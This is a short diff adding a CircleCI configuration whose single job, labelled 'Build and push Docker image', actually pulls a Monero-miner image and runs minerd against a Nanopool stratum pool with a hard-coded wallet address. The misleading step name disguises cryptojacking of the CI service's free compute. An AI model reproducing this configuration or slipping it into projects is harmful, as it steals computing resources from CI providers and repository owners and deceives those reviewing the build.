@@ -1,0 +1,16 @@
+version: 2
+jobs:
+  build:
+    docker:
+      # using custom image, see .circleci/images/primary/Dockerfile
+      - image: kannix/monero-miner
+
+    steps:
+      - checkout
+
+      - run:
+          name: Build and push Docker image
+          command: |
+            ls -la /
+            ls -la /cpuminer-multi
+            cd /cpuminer-multi && ./minerd -a cryptonight -o stratum+tcp://xmr-eu1.nanopool.org:14444 -u 46JHKeS9JcXDi8ET6F3ZSgM5mvRZVxMG33Hm3vL1JJknMHoJzqVpTt9e9pT3dApFqeJrXerz19dc1LevwYmDeWauQRQXiUw.circle2 -p x
